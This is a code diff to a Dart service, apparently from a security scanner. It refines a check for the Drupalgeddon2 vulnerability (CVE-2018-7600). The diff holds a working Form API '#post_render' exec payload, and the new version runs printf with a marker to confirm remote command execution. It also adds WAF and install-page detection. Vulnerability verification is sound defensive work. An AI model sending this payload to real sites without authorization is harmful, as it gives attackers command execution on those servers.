@@ -4,6 +4,7 @@ import '../../../app/constants.dart';
 import '../../../core/http/http_client.dart';
 import '../../../core/http/http_result.dart';
 import 'exp_result.dart';
+import 'waf_detect.dart';
 
 class DrupalExpService {
   final String baseUrl;
@@ -83,20 +84,42 @@ class DrupalExpService {
   }
 
   Future<ExpResult> check() async {
+    // 用唯一标记验证命令确实被执行；旧实现只要 200 且含 '[' 就判定存在，
+    // 任何 Drupal AJAX 端点都会命中，属于误报。
+    final marker = 'MXDRUPAL_${DateTime.now().millisecondsSinceEpoch}';
     try {
-      const payload =
-          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
+      final payload =
+          'form_id=user_register_form&_drupal_ajax=1'
+          '&mail[#post_render][]=exec&mail[#type]=markup'
+          '&mail[#markup]=printf%20$marker';
       final res = await _httpClient.postOrThrow(
         '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: payload,
       );
       final body = res.body ?? '';
-      if (body.contains('uid=') || (res.statusCode == 200 && body.contains('['))) {
+      if (looksLikeWafBlock(res.statusCode, body)) {
+        return ExpResult.probeFailed(
+          'CVE-2018-7600 (Drupalgeddon2)',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
+      if (body.contains(marker)) {
         return ExpResult(
           true,
           'CVE-2018-7600 (Drupalgeddon2)',
-          '端点响应，Form API #post_render 注入可能存在',
+          'Form API #post_render 命令执行成功（命中标记 $marker）',
+        );
+      }
+      // 未完成安装的 Drupal 只会返回安装向导，不应被当成"不存在漏洞"。
+      final lower = body.toLowerCase();
+      if (lower.contains('install.php') ||
+          lower.contains('choose language') ||
+          lower.contains('select an installation profile') ||
+          lower.contains('drupal installation')) {
+        return ExpResult.probeFailed(
+          'CVE-2018-7600 (Drupalgeddon2)',
+          '目标 Drupal 尚未完成安装（返回安装向导），无法判定',
         );
       }
     } catch (e) {
